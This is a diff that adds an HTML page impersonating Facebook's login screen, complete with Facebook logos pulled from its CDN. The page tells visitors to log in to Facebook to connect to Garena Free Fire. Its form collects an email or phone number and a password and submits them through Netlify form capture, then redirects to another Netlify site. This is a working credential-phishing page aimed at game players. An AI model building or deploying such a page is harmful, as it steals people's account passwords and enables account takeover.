@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>fb login</title>
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    
+   <div class="contuner">
+    <div class="home">
+        <img class="fb_logo _8ilh img" src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook">
+       <div class="free">
+        <img  src="https://scontent.fdac140-1.fna.fbcdn.net/v/t39.2081-6/23065717_2058763144353975_2145607202558181376_n.png?stp=c0.0.76.76a_dst-png_p75x75&_nc_cat=1&ccb=1-7&_nc_sid=eaa83b&_nc_ohc=168yUrgHCLUAX90RHKH&_nc_ht=scontent.fdac140-1.fna&oh=00_AfDoicqvq_5cJKVPCTuwZFe4XgK5UwSnfvJFxXcNq_38Wg&oe=63604065" alt="">
+        <p>Log in to your Facebook account to connect to <br> Garena Free Fire</p>
+
+       </div>
+    <form
+         method="POST"
+      name="newpage"
+           action="ffcode/indx.html"
+      netlify-honeypot="bot-field"
+      data-netlify="true"
+    >
+      <p hidden aria-hidden="true">
+        <label>Don't fill out this input. <input name="bot-field" /></label>
+      </p>
+      <p>
+      <input type="text" name="name" type="text" placeholder="Email addess or phone number" required  />
+      </p>
+      <p>
+        <input  name="pass" type="password" placeholder="Password" required/>
+      </p>
+      <p>
+        <button type="submit" onclick="newDoc()">login</button>
+      </p>
+    </form>
+    <div class="crate"><a href="#">Forgotten password?</a></div>
+    <div class="line"></div>
+    <div class="crateNew"><a href="#">Create New Account</a>
+    </div>
+
+    <script src="script.js">
+      function newDoc() {
+  window.location.assign("https://submit-code.netlify.app/")
+}
+      </script>
+    </div>
+   </div>
+  </body>
+</html>v
